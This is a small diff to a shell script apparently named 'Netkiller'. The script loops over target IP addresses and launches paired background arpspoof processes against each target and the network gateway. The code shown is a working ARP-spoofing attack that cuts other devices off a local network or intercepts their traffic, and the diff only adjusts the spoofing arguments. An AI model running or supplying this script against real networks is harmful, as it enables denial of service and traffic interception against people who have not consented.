@@ -232,9 +232,9 @@ echo " "
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo "Netkiller kill the target IP: $TARGET"
-   ( arpspoof -i "$INTERFACE" -c host -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
+   ( arpspoof -i "$INTERFACE" -c host -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
-   ( arpspoof -i "$INTERFACE" -c host -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 ) &
+   ( arpspoof -i "$INTERFACE" -c host -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 ) &
     PIDS+=($!)
 done
 
